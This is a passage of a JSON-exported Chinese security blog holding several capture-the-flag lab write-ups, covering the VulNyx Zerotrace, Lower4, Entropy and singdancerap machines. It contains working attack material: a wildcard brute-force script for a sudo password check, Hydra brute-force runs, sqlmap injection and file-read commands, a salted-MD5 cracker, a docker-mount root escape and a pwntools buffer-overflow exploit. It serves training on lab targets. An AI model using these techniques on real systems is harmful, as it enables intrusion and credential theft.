8611c2cca079871a28487055892\u0026#34;},\u0026#34;id\u0026#34;:\u0026#34;0c431e07-6087-4368-a973-ed3fb4ec5045\u0026#34;,\u0026#34;version\u0026#34;:3}\rshelldredd@zerotrace:/home/ll104567$ cat one Why don\u0026#39;t we join two universes and see who\u0026#39;s the strongest?\rsaitama\rgenos\rmumen\rspeed-o\rfubuki\rbang\rtatsumaki\rboros\rdrkuseno\ronepunchman\rkarin\rzombieman\rchildemperor\rstinger 经过搜索secret是一个 Ethereum 钱包文件，这个文件通常用于保存加密的私钥，只有通过正确的密码才能解密并获取私钥。但是这里不是这个考点。\n注意！！！！！\n这里有个隐藏的东西，就是one里面的内容是一拳超人的角色名，提到的两个宇宙中的另一个宇宙就是龙珠（dragonballz），因此需要将在前面统一加上dragonballz的前缀。\nRoot #\r查看guessme的内容\nll104567@zerotrace:~$ cat guessme #!/bin/bash\rFTP_USER=\u0026#34;admin\u0026#34;\rFTP_PASS=$(cat /root/.creds)\recho -n \u0026#34;Please provide the password for $FTP_USER: \u0026#34;\rread -s INPUT_PASS\recho\rCLEAN_PASS=$(echo \u0026#34;$INPUT_PASS\u0026#34; | sed \u0026#39;s/[[:space:]]//g\u0026#39;)\rif [[ $FTP_PASS == $CLEAN_PASS ]]; then\recho \u0026#34;Password matches!\u0026#34;\rexit 0\relse\recho \u0026#34;Access denied!\u0026#34;\rexit 1\rfi 输入那里，有一个sed去掉空白字符。\n这里主要考察的是Linux里的**通配符(?)**匹配\n先写个脚本来检测有多少位\nfor i in {1..100}; do # 创建一个由 i 个 ? 组成的字符串\rpattern=$(printf \u0026#34;?%.0s\u0026#34; $(seq 1 $i))\r# 显示当前正在尝试的长度\recho \u0026#34;Trying password with length $i: $pattern\u0026#34;\r# 使用通配符展开，尝试当前长度的密码\recho $pattern | sudo /bin/bash /home/ll104567/guessme # 如果密码匹配，退出循环\rif [ $? -eq 0 ]; then\recho \u0026#34;Password with length $i is correct!\u0026#34;\rbreak\rfi\rdone 发现密码一共有49位。类似于SQL注入的方式，先用49个通配符，然后逐一测试。\n#!/bin/bash\rcharset=\u0026#34;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789\u0026#34;\r# 密码长度\rpassword_length=49\r# 初始化密码为49个问号\rcurrent_password=$(printf \u0026#34;%-${password_length}s\u0026#34; \u0026#34;?\u0026#34; | tr \u0026#39; \u0026#39; \u0026#39;?\u0026#39;)\r# 暴力破解每个字符\rfor i in $(seq 1 $password_length); do\r# 遍历字符集，暴力破解当前字符位置\rfor char in $(echo $charset | sed \u0026#39;s/./\u0026amp; /g\u0026#39;); do\r# 替换密码中当前位置的字符\rcurrent_password=\u0026#34;${current_password:0:$i-1}$char${current_password:$i}\u0026#34;\r# 使用 guessme 脚本测试当前密码\rresult=$(echo $current_password | sudo /bin/bash /home/ll104567/guessme)\r# 如果密码匹配，输出结果并继续到下一个字符\rif [[ $result == *\u0026#34;Password matches!\u0026#34;* ]]; then\recho \u0026#34;Current correct password: $current_password\u0026#34;\rbreak\rfi\rdone\rdone\recho \u0026#34;Password is correct: $current_password\u0026#34; 然后拿到root\nSummary #\rUser：目录扫描，参数爆破，读取到**/proc/pid/cmdline进程参数文件，得到J4ckie0x17权限。通过chattr取消掉不可修改的文件，写入反弹shell**，得到shelldredd的权限。最后通过留言，进行猜测拼接，进行ssh爆破登录，拿到ll104567。\nRoot：在Linux系统中，( ? )问号是一个通配符，用于匹配单个字符。这里通过对每一位进行尝试爆破，最终得到root的密码。\n","date":"2025-03-16","externalUrl":null,"permalink":"/posts/2025/03/vulnyx-zerotrace/","section":"Posts","summary":"","title":"VulNyx-Zerotrace","type":"posts"},{"content":"\rBox Info #\rOS Linux Difficulty Low Nmap #\r[root@kali] /home/kali/Lower4 ❯ nmap 192.168.56.120 -sV -A PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)\r| ssh-hostkey: | 3072 f0:e6:24:fb:9e:b0:7a:1a:bd:f7:b1:85:23:7f:b1:6f (RSA)\r| 256 99:c8:74:31:45:10:58:b0:ce:cc:63:b4:7a:82:57:3d (ECDSA)\r|_ 256 60:da:3e:31:38:fa:b5:49:ab:48:c3:43:2c:9f:d1:32 (ED25519)\r|_auth-owners: root\r80/tcp open http Apache httpd 2.4.56 ((Debian))\r|_http-server-header: Apache/2.4.56 (Debian)\r|_http-title: Apache2 Debian Default Page: It works\r113/tcp open ident?\r|_auth-owners: lucifer\rMAC Address: 08:00:27:DE:A3:91 (Oracle VirtualBox virtual NIC)\rDevice type: general purpose\rRunning: Linux 4.X|5.X\rOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5\rOS details: Linux 4.15 - 5.8\rNetwork Distance: 1 hop\rService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel 从113端口上扫描到一个用户名：lucifer\n尝试使用ssh爆破\nHydra #\r[root@kali] /home/kali/Lower4 ❯ hydra -l lucifer -P /usr/share/wordlists/rockyou.txt ssh://192.168.56.120 -I ⏎\rHydra v9.5 (c) 2023 by van Hauser/THC \u0026amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).\rHydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-03-15 20:10:43\r[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4\r[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344400 login tries (l:1/p:14344400), ~896525 tries per task\r[DATA] attacking ssh://192.168.56.120:22/\r[STATUS] 227.00 tries/min, 227 tries in 00:01h, 14344178 to do in 1053:11h, 11 active\r[22][ssh] host: 192.168.56.120 login: lucifer password: 789456123\r1 of 1 target successfully completed, 1 valid password found\r[WARNING] Writing restore file because 5 final worker threads did not complete until end.\r[ERROR] 5 targets did not resolve or could not be connected\r[ERROR] 0 target did not complete\rHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-03-15 20:12:07 得到密码是789456123\nRoot #\r查看特殊命令\nlucifer@lower4:~$ sudo -l\rMatching Defaults entries for lucifer on lower4:\renv_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\rUser lucifer may run the following commands on lower4:\r(root) NOPASSWD: /usr/bin/multitail 可以直接通过这个命令查看ssh私钥\nlucifer@lower4:~$ sudo /usr/bin/multitail /root/.ssh/id_rsa 也可以使用**-l参数进行执行命令，但这里无法正常开始bash**，需要间接执行。\nSummary #\r比较简单的一个靶机，Nmap泄露出用户名，然后爆破登录拿到user。通过multitail的直接读取或者命令执行提升到root。\n","date":"2025-03-15","externalUrl":null,"permalink":"/posts/2025/03/vulnyx-lower4/","section":"Posts","summary":"","title":"VulNyx-Lower4","type":"posts"},{"content":"\rBox Info #\rOS Linux Difficulty Medium Nmap #\r[root@kali] /home/kali/Entropy ❯ nmap 192.168.56.117 -sV -A -p- PORT STATE SERVICE VERSION\r22/tcp open ssh OpenSSH 9.2p1 Debian 2+deb12u5 (protocol 2.0)\r| ssh-hostkey: | 256 cc:05:ab:8c:ea:28:eb:b1:9d:da:8c:ce:65:ee:63:43 (ECDSA)\r|_ 256 3f:9f:0a:7d:61:f8:6f:4b:46:01:c4:db:74:b2:b6:a7 (ED25519)\r80/tcp open http Apache httpd 2.4.62 ((Debian))\r|_http-server-header: Apache/2.4.62 (Debian)\r|_http-title: Apache2 Debian Default Page: It works 目录扫描没有任何结果，在apache默认页中发现路径\nSQL Injection #\r进入之后查看到当前版本是：2.2.9.1\n查找一下漏洞刚好有，不过这个脚本是python2写的，还是去找找网上的。\nAzrenom/CMS-Made-Simple-2.2.9-CVE-2019-9053 由于密码是MD5加密的，而且已经有盐值了，尝试解密一下。\n注意！！！！！！！！！！\n这里有个坑，就是密码不在rockyou.txt中。比较粗暴的方法就是，把所有密码字典整合到一个里面进行跑。\n上图应该是我之前在Github上找的字典。整合可以让AI给出代码，这里我就不写了。\nimport hashlib\r# 目标哈希值和盐\rtarget_hash = \u0026#34;7c21f3b3cace708d3e270b44dd40d522\u0026#34; # 你提取到的哈希\rsalt = \u0026#34;711c5b8581584acc\u0026#34; # 你提取到的盐\rwordlist_path = \u0026#34;/usr/share/SecLists/Passwords/clean_passwords.txt\u0026#34; # 本地密码字典路径\rdef crack_md5_hash(target_hash, salt, wordlist_path):\rtry:\rwith open(wordlist_path, \u0026#34;r\u0026#34;, encoding=\u0026#34;latin-1\u0026#34;) as file:\rfor password in file:\rpassword = password.strip()\rsalted_password = salt+ password # CMS Made Simple 使用 \u0026#34;密码+盐\u0026#34; 方式\rhashed_password = hashlib.md5(salted_password.encode()).hexdigest()\rif hashed_password == target_hash:\rprint(f\u0026#34;[+] 密码破解成功！密码是: {password}\u0026#34;)\rreturn\rprint(\u0026#34;[-] 未能找到匹配的密码，请尝试更大的字典。\u0026#34;)\rexcept FileNotFoundError:\rprint(f\u0026#34;[-] 无法找到字典文件: {wordlist_path}\u0026#34;)\rexcept Exception as e:\rprint(f\u0026#34;[-] 发生错误: {e}\u0026#34;)\r# 执行破解\rcrack_md5_hash(target_hash, salt, wordlist_path) Gobuster #\r这个时候尝试寻找登录点，发现admin路由\n[root@kali] /home/kali/Entropy ❯ gobuster dir -u http://192.168.56.117/cmsms -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -t 50 -x php\r===============================================================\rGobuster v3.6\rby OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart)\r===============================================================\r[+] Url: http://192.168.56.117/cmsms\r[+] Method: GET\r[+] Threads: 50\r[+] Wordlist: /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt\r[+] Negative Status codes: 404\r[+] User Agent: gobuster/3.6\r[+] Extensions: php\r[+] Timeout: 10s\r===============================================================\rStarting gobuster in directory enumeration mode\r===============================================================\r/modules (Status: 301) [Size: 324] [--\u0026gt; http://192.168.56.117/cmsms/modules/]\r/uploads (Status: 301) [Size: 324] [--\u0026gt; http://192.168.56.117/cmsms/uploads/]\r/index.php (Status: 200) [Size: 20019]\r/doc (Status: 301) [Size: 320] [--\u0026gt; http://192.168.56.117/cmsms/doc/]\r/admin (Status: 301) [Size: 322] [--\u0026gt; http://192.168.56.117/cmsms/admin/]\r/assets (Status: 301) [Size: 323] [--\u0026gt; http://192.168.56.117/cmsms/assets/]\r/.php (Status: 403) [Size: 279]\r/lib (Status: 301) [Size: 320] [--\u0026gt; http://192.168.56.117/cmsms/lib/]\r/config.php (Status: 200) [Size: 0]\r/tmp (Status: 301) [Size: 320] [--\u0026gt; http://192.168.56.117/cmsms/tmp/]\r/.php (Status: 403) [Size: 279]\rProgress: 2547664 / 2547666 (100.00%)\r===============================================================\rFinished\r=============================================================== 登录进去后发现，可以上传模块\nRCE to www-data #\rCMS Made Simple Authenticated RCE via object injection 成功接收到反弹Shell\nHydra #\r查看config.php\nmeterpreter \u0026gt; cat config.php\r\u0026lt;?php\r# CMS Made Simple Configuration File\r# Documentation: https://docs.cmsmadesimple.org/configuration/config-file/config-reference\r#\r$config[\u0026#39;dbms\u0026#39;] = \u0026#39;mysqli\u0026#39;;\r$config[\u0026#39;db_hostname\u0026#39;] = \u0026#39;localhost\u0026#39;;\r$config[\u0026#39;db_username\u0026#39;] = \u0026#39;cmsuser\u0026#39;;\r$config[\u0026#39;db_password\u0026#39;] = \u0026#39;!@$john!@$\u0026#39;;\r$config[\u0026#39;db_name\u0026#39;] = \u0026#39;cmsms\u0026#39;;\r$config[\u0026#39;db_prefix\u0026#39;] = \u0026#39;cms_\u0026#39;;\r$config[\u0026#39;timezone\u0026#39;] = \u0026#39;America/New_York\u0026#39;; 由于只能通过密钥登录，这里拿到也没什么用，上linpeas！！\n注意到内网端口8080是开放的\n查看进程发现是support用户在运行，这里应该是入手点\n上传一个socat，将端口转发出来\n./socat TCP-LISTEN:9090,reuseaddr,fork TCP:127.0.0.1:8080 \u0026amp; 可以看到是一个登录页面，之前的用户在这里无法登录\n经过搜索，得到默认账户是openplc，但是密码已经被修改过了\n这里使用hydra进行爆破，得到密码是bubbles\n[root@kali] /home/kali/Entropy ❯ hydra -l openplc -P /usr/share/wordlists/rockyou.txt -s 9090 192.168.56.117 http-post-form \u0026#34;/login:username=^USER^\u0026amp;password=^PASS^:F=Bad credentials! Try again\u0026#34; -I\rHydra v9.5 (c) 2023 by van Hauser/THC \u0026amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).\rHydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-03-12 22:09:55\r[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore\r[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344400 login tries (l:1/p:14344400), ~896525 tries per task\r[DATA] attacking http-post-form://192.168.56.117:9090/login:username=^USER^\u0026amp;password=^PASS^:F=Bad credentials! Try again\r[9090][http-post-form] host: 192.168.56.117 login: openplc password: bubbles\r1 of 1 target successfully completed, 1 valid password found\rHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-03-12 22:09:57 RCE to user #\rthewhiteh4t/cve-2021-31630: Python script for exploiting command injection in Open PLC Webserver v3 写入公钥之后，可以进行ssh登录，拿到user.txt\nRoot #\r查看到留言\nsupport@debian:~/Desktop$ cat note.txt Subject: Important: Password Change Notification\rDear Support,\rFor security reasons, I have changed your password to this \u0026#34;ap580903\u0026#34; plus the year your were born! Please make sure to update it as soon as possible.\rIf you experience any issues or need assistance, feel free to reach out.\rBest, System Administrator 发现密码是ap580903加上一个年份，上传suForce，得到密码是：ap5809031995\n查看特殊命令\nsupport@debian:~$ sudo -l\r[sudo] password for support: Matching Defaults entries for support on debian:\renv_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, use_pty, timestamp_timeout=1\rUser support may run the following commands on debian:\r(ALL) /usr/bin/docker docker | GTFOBins 查看一下容器\nsudo /usr/bin/docker run -v /:/mnt --rm -it alpine chroot /mnt sh Summary #\rUser：SQL注入拿到www-data权限，发现support用户有服务运行在内网，转发内网端口，通过cve-2021-31630反弹shell，拿到support用户。\nRoot：根据留言得到密码逻辑，爆破后通过sudo docker拿到root.txt。\n","date":"2025-03-13","externalUrl":null,"permalink":"/posts/2025/03/vulnvm-entropy/","section":"Posts","summary":"","title":"VulnVM-Entropy","type":"posts"},{"content":"","date":"2025-03-12","externalUrl":null,"permalink":"/categories/ctf/","section":"Categories","summary":"","title":"Ctf","type":"categories"},{"content":"\rBox Info #\rOS Linux Difficulty Hard Nmap #\r[root@kali] /home/kali ❯ nmap 192.168.56.116 -sV -A -p-\rPORT STATE SERVICE VERSION\r22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u4 (protocol 2.0)\r| ssh-hostkey: | 2048 5d:41:2a:c1:2d:3b:6c:78:b3:af:ae:9d:42:fe:88:b8 (RSA)\r| 256 3c:e9:64:eb:84:fe:5c:83:94:07:27:6c:12:14:c8:4c (ECDSA)\r|_ 256 09:9b:2b:18:de:6c:6d:f8:8b:15:df:6c:0f:c0:7c:b2 (ED25519)\r80/tcp open http Apache httpd 2.4.59 ((Debian))\r|_http-server-header: Apache/2.4.59 (Debian)\r|_http-title: News Website\r65000/tcp filtered unknown Gobuster #\r[root@kali] /home/kali ❯ gobuster dir -u http://192.168.56.116/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x php,html,txt\r===============================================================\rGobuster v3.6\rby OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart)\r===============================================================\r[+] Url: http://192.168.56.116/\r[+] Method: GET\r[+] Threads: 50\r[+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\r[+] Negative Status codes: 404\r[+] User Agent: gobuster/3.6\r[+] Extensions: php,html,txt\r[+] Timeout: 10s\r===============================================================\rStarting gobuster in directory enumeration mode\r===============================================================\r/.php (Status: 403) [Size: 279]\r/index.html (Status: 200) [Size: 3118]\r/news.php (Status: 200) [Size: 1301]\r/.html (Status: 403) [Size: 279]\r/.php (Status: 403) [Size: 279]\r/.html (Status: 403) [Size: 279]\r/littlesecrets (Status: 301) [Size: 324] [--\u0026gt; http://192.168.56.116/littlesecrets/]\r/server-status (Status: 403) [Size: 279]\rProgress: 882240 / 882244 (100.00%)\r===============================================================\rFinished\r=============================================================== 针对这个**/littlesecrets**再次进行扫描\n[root@kali] /home/kali ❯ gobuster dir -u http://192.168.56.116/littlesecrets -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x php,html,txt\r===============================================================\rGobuster v3.6\rby OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart)\r===============================================================\r[+] Url: http://192.168.56.116/littlesecrets\r[+] Method: GET\r[+] Threads: 50\r[+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\r[+] Negative Status codes: 404\r[+] User Agent: gobuster/3.6\r[+] Extensions: php,html,txt\r[+] Timeout: 10s\r===============================================================\rStarting gobuster in directory enumeration mode\r===============================================================\r/.php (Status: 403) [Size: 279]\r/.html (Status: 403) [Size: 279]\r/login.php (Status: 200) [Size: 1983]\r/manager.php (Status: 302) [Size: 0] [--\u0026gt; login.php]\r/.html (Status: 403) [Size: 279]\r/.php (Status: 403) [Size: 279]\rProgress: 882240 / 882244 (100.00%)\r===============================================================\rFinished\r=============================================================== SQL Injection #\r[root@kali] /home/kali/singdancerap ❯ sqlmap -u \u0026#34;http://192.168.56.116/littlesecrets/login.php\u0026#34; --data \u0026#34;username=123\u0026amp;password=123\u0026#34; -p username --level 5\rsqlmap identified the following injection point(s) with a total of 2625 HTTP(s) requests:\r---\rParameter: username (POST)\rType: time-based blind\rTitle: MySQL \u0026gt;= 5.0.12 AND time-based blind (query SLEEP)\rPayload: username=123\u0026#39; AND (SELECT 9142 FROM (SELECT(SLEEP(5)))mFLQ)-- TXmn\u0026amp;password=123\r--- 可以看到存在SQL注入漏洞\n查看数据库\n[root@kali] /home/kali/singdancerap ❯ sqlmap -u \u0026#34;http://192.168.56.116/littlesecrets/login.php\u0026#34; --data \u0026#34;username=123\u0026amp;password=123\u0026#34; -p username --level 5 --dbs available databases [4]:\r[*] information_schema\r[*] mysql\r[*] news_db\r[*] performance_schema 查看表\n[root@kali] /home/kali/singdancerap ❯ sqlmap -u \u0026#34;http://192.168.56.116/littlesecrets/login.php\u0026#34; --data \u0026#34;username=123\u0026amp;password=123\u0026#34; -p username --level 5 -D news_db --tables Database: news_db\r[2 tables]\r+-------+\r| news |\r| users |\r+-------+ 获取到用户\n[root@kali] /home/kali/singdancerap ❯ sqlmap -u \u0026#34;http://192.168.56.116/littlesecrets/login.php\u0026#34; --data \u0026#34;username=123\u0026amp;password=123\u0026#34; -p username --level 5 -D news_db -T users --dump\rDatabase: news_db\rTable: users\r[2 entries]\r+----+-----------+----------+\r| id | password | username |\r+----+-----------+----------+\r| 1 | password1 | user1 |\r| 2 | password2 | user2 |\r+----+-----------+----------+ 但是无法直接登录\n这里的注入点在时间盲注，由于我已经知道了news的列数，可以返回到新闻主页进行联合注入。\n（这里之前走了弯路，盲注会浪费很多时间。。。。\n[root@kali] /home/kali/singdancerap ❯ sqlmap -u \u0026#34;http://192.168.56.116/news.php?title=sing\u0026#34; ---\rParameter: title (GET)\rType: boolean-based blind\rTitle: AND boolean-based blind - WHERE or HAVING clause\rPayload: title=sing\u0026#39; AND 8471=8471 AND \u0026#39;tXIm\u0026#39;=\u0026#39;tXIm\rType: time-based blind\rTitle: MySQL \u0026gt;= 5.0.12 AND time-based blind (query SLEEP)\rPayload: title=sing\u0026#39; AND (SELECT 8023 FROM (SELECT(SLEEP(5)))QuwV) AND \u0026#39;rjTs\u0026#39;=\u0026#39;rjTs\rType: UNION query\rTitle: Generic UNION query (NULL) - 3 columns\rPayload: title=sing\u0026#39; UNION ALL SELECT NULL,CONCAT(0x717a707871,0x7a6749484b6e754f74666a585a616d494d734a4776796e6f43724c4662434b6a65614d735a4b4745,0x7170707871),NULL-- -\r--- 可以读取文件，发现存在一个he110wor1d用户\n[root@kali] /home/kali/singdancerap ❯ sqlmap -u \u0026#34;http://192.168.56.116/news.php?title=sing\u0026#34; --file-read=/etc/passwd\r[*] /root/.local/share/sqlmap/output/192.168.56.116/files/_etc_passwd\r[root@kali] /home/kali/singdancerap ❯ cat /root/.local/share/sqlmap/output/192.168.56.116/files/_etc_passwd |grep /home\rhe110wor1d:x:1001:1001::/home/he110wor1d:/bin/bash 由于中间件是Apache，尝试读取配置文件\n[root@kali] /home/kali/singdancerap ❯ sqlmap -u \u0026#34;http://192.168.56.116/news.php?title=sing\u0026#34; --file-read=/etc/apache2/apache2.conf 可以看到网站的路径，因此尝试读取manager.php的内容\n[root@kali] /home/kali/singdancerap ❯ sqlmap -u \u0026#34;http://192.168.56.116/news.php?title=sing\u0026#34; --file-read=/var/www/he110wor1d/littlesecrets/manager.php\r....\r\u0026lt;?php\rsession_start();\rif (!isset($_SESSION[\u0026#39;username\u0026#39;])) {\rheader(\u0026#34;Location: login.php\u0026#34;);\rexit();\r}\rif ($_SESSION[\u0026#39;username\u0026#39;] !== \u0026#39;he110wor1d_admin\u0026#39;) {\rdie(\u0026#34;Access Denied. You do not have permission to access this page.\u0026#34;);\r}\r$command_output = \u0026#39;\u0026#39;;\rif ($_SERVER[\u0026#34;REQUEST_METHOD\u0026#34;] == \u0026#34;POST\u0026#34; \u0026amp;\u0026amp; isset($_POST[\u0026#39;command\u0026#39;])) {\r$command = $_POST[\u0026#39;command\u0026#39;];\r$command_output = shell_exec($command);\r}\r?\u0026gt;\r\u0026lt;body\u0026gt;\r\u0026lt;div class=\u0026#34;manager-container\u0026#34;\u0026gt;\r\u0026lt;h2\u0026gt;Manager Panel\u0026lt;/h2\u0026gt;\r\u0026lt;form action=\u0026#34;manager.php\u0026#34; method=\u0026#34;POST\u0026#34;\u0026gt;\r\u0026lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;command\u0026#34; placeholder=\u0026#34;Enter command\u0026#34; required\u0026gt;\r\u0026lt;input type=\u0026#34;submit\u0026#34; value=\u0026#34;Execute\u0026#34;\u0026gt;\r\u0026lt;/form\u0026gt;\r\u0026lt;?php if (!empty($command_output)): ?\u0026gt;\r\u0026lt;div class=\u0026#34;output\u0026#34;\u0026gt;\r\u0026lt;h3\u0026gt;Command Output:\u0026lt;/h3\u0026gt;\r\u0026lt;pre\u0026gt;\u0026lt;?php echo htmlspecialchars($command_output); ?\u0026gt;\u0026lt;/pre\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;?php endif; ?\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;/body\u0026gt; 可以看到有一个参数可以控制，但是必须要session值正确，这里我尝试过写入session文件，但是不起作用。\n读取一下login.php，看到了基本的登录逻辑，单引号闭合。\n[root@kali] /home/kali/singdancerap ❯ sqlmap -u \u0026#34;http://192.168.56.116/news.php?title=sing\u0026#34; --file-read=/var/www/he110wor1d/littlesecrets/login.php \u0026lt;?php\r// Database connection\r$servername = \u0026#34;localhost\u0026#34;;\r$username = \u0026#34;root\u0026#34;;\r$password = \u0026#34;i_love_sing_dance_rap\u0026#34;;\r$dbname = \u0026#34;news_db\u0026#34;;\r$conn = new mysqli($servername, $username, $password, $dbname);\rif ($conn-\u0026gt;connect_error) {\rdie(\u0026#34;Connection failed: \u0026#34; . $conn-\u0026gt;connect_error);\r}\r$login_error = \u0026#34;\u0026#34;;\rif ($_SERVER[\u0026#34;REQUEST_METHOD\u0026#34;] == \u0026#34;POST\u0026#34;) {\r$username = $_POST[\u0026#39;username\u0026#39;];\r$password = $_POST[\u0026#39;password\u0026#39;];\r$sql = \u0026#34;SELECT id, username, password FROM users where username=\u0026#39;$username\u0026#39;\u0026#34;;\r$result = $conn-\u0026gt;query($sql);\rif ($result-\u0026gt;num_rows \u0026gt; 0) {\r$row = $result-\u0026gt;fetch_assoc();\rif ($password === $row[\u0026#39;password\u0026#39;]) {\rsession_start();\r$_SESSION[\u0026#39;user_id\u0026#39;] = $row[\u0026#39;id\u0026#39;];\r$_SESSION[\u0026#39;username\u0026#39;] = $row[\u0026#39;username\u0026#39;];\rheader(\u0026#34;Location: manager.php\u0026#34;);\rexit();\r} else {\r$login_error = \u0026#34;Invalid username or password.\u0026#34;;\r}\r} else {\r$login_error = \u0026#34;Invalid username or password.\u0026#34;;\r}\r}\r$conn-\u0026gt;close();\r?\u0026gt; 因此可以构造payload\nusername: \u0026#39; union select 1,\u0026#39;he110wor1d_admin\u0026#39;,\u0026#39;pass\rpassword: pass 反弹shell之后切换用户即可，然后写入ssh密钥。\nRoot #\r在用户目录下查找到一个二进制文件thekey2root，使用32位ida进行反编译\nint __cdecl main(int argc, const char **argv, const char **envp)\r{\rsystem(\u0026#34;echo \u0026#39;input something:\u0026#39;\u0026#34;);\rinput(\u0026amp;argc);\rsystem(\u0026#34;echo \u0026#39;thanks for your input\u0026#39;\u0026#34;);\rreturn 0;\r}\rint input()\r{\rchar v1[24]; // [esp+Ch] [ebp-1Ch] BYREF\rreturn __isoc99_scanf(\u0026#34;%s\u0026#34;, v1);\r}\rint sing_dance_rap()\r{\rsetuid(0);\rsetgid(0);\rreturn system(\u0026#34;echo \u0026#39;Hey,bro! What are you looking for?\u0026#39;\u0026#34;);\r} 可以看到很明显的栈溢出漏洞，让deepseek帮助写一个脚本\nfrom pwn import *\r# 设置上下文和程序路径\rcontext(arch=\u0026#39;i386\u0026#39;, os=\u0026#39;linux\u0026#39;)\relf = ELF(\u0026#39;./thekey2root\u0026#39;) # 替换为你的程序名\r# 获取函数地址\rsing_dance_rap_addr = elf.symbols[\u0026#39;sing_dance_rap\u0026#39;]\rsystem_addr = elf.plt[\u0026#39;system\u0026#39;]\r# 通过调试获取v1的地址（例如：0xffffd0ac）\rv1_addr = 0xffe8378c # 替换为实际地址\r# 构造payload\rpayload = b\u0026#39;/bin/sh\\x00\u0026#39; # 将/bin/sh写入缓冲区\rpayload += b\u0026#39;A\u0026#39; * (32 - len(payload)) # 填充至32字节\rpayload += p32(sing_dance_rap_addr) # 覆盖返回地址到sing_dance_rap\rpayload += p32(system_addr) # sing_dance_rap返回后执行system\rpayload += p32(0xdeadbeef) # system的返回地址（占位）\rpayload += p32(v1_addr) # system的参数，指向/bin/sh\r# 启动进程并发送payload\rp = process(\u0026#39;./thekey2root\u0026#39;)\rp.send(payload) # 使用send而非sendline避免附加换行符\rp.interactive() # 进入交互模式 可以看到成功进入到了sing_dance_rap函数，现在要想办法控制system的参数\n由于input函数中的数组是在函数内部声明的，也就是一个局部变量，外部无法访问到\n因此我们要寻找可以写入或者能利用的字符串，很遗憾并不存在\n那就只能查找现有的字符串了\n在C语言中，如果是以字符串地址作为参数的话，那么函数会按照字节逐个读取，直到遇到 \\0 才停止\n而在上面可以看到的是在0x804a03e这个位置，也就是s的地址，后面刚好有一个**\\x00**\n有了这个合法的字符串，接下来要做的就是体现在linux里面，因为实际上函数内执行的是system(\u0026ldquo;s\u0026rdquo;)\n那么如果存在有一个s的二进制文件，而里面刚好有提权部分的代码，就可以执行命令\n在本地调试一下\n[root@kali] /home/kali/singdancerap ❯ export PATH=.:$PATH #设置当前目录优先\r[root@kali] /home/kali/singdancerap ❯ cat s /bin/bash -p\r[root@kali] /home/kali/singdancerap ❯ chmod +x s 可以看到即使不是以root身份运行也可以成功\n那么现在要做的就是，在靶机上声明环境变量，然后创建可执行文件**（s）**，然后把二进制文件挂载到端口上\nhe110wor1d@singdancerap:~/thekey2root$ cat s\r/bin/bash -p\rhe110wor1d@singdancerap:~/thekey2root$ chmod +x s\rhe110wor1d@singdancerap:~/thekey2root$ export PATH=.:$PATH\rhe110wor1d@singdancerap:~/thekey2root$ nc -lvp 12345 -e ./thekey2root 然后修改一下pwn脚本\nfrom pwn import *\r# 设置上下文和程序路径\rcontext(arch=\u0026#39;i386\u0026#39;, os=\u0026#39;linux\u0026#39;)\relf = ELF(\u0026#39;./thekey2root\u0026#39;) # 替换为你的程序名\r# 获取函数地址\rsing_dance_rap_addr = elf.symbols[\u0026#39;sing_dance_rap\u0026#39;]\rsystem_addr = elf.plt[\u0026#39;system\u0026#39;]\rs_addr = 0x804a03e # 替换为实际地址\r# 构造payload\rpayload = b\u0026#39;/bin/sh\\x00\u0026#39; # 将/bin/sh写入缓冲区\rpayload += b\u0026#39;A\u0026#39; * (32 - len(payload)) # 填充至32字节\rpayload += p32(sing_dance_rap_addr) # 覆盖返回地址到sing_dance_rap\rpayload += p32(system_addr) # sing_dance_rap返回后执行system\rpayload += p32(0xdeadbeef) # system的返回地址（占位）\rpayload += p32(s_addr)\r# 启动进程并发送payload\rp = remote(\u0026#39;192.168.56.116\u0026#39;,12345)\rp.send(payload) # 使用send而非sendline避免附加换行符\rp.interactive() # 进入交互模式 Summary 